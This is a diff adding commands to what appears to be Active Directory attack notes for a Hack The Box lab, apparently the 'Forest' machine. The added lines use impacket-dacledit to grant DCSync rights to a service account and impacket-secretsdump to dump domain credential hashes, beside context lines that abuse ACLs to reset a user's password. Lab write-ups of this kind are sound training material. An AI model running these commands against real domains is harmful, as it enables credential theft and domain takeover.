@@ -1690,6 +1690,11 @@ Add-DomainObjectAcl -Rights all -TargetIdentity GPOADM -PrincipalIdentity Amelia
 $cred = ConvertTo-SecureString '0xdf0xdf.' -AsPlainText -Force
 Set-DomainUserPassword GPOADM -AccountPassword $cred
 ```
+```bash
+impacket-dacledit -action 'write' -rights 'DCSync' -principal 'svc-alfresco' -target-dn 'DC=HTB,DC=LOCAL' 'htb.local'/'svc-alfresco':'s3rvice'
+
+impacket-secretsdump  htb.local/'svc-alfresco':s3rvice@10.129.95.210
+```
   
 </details>
 
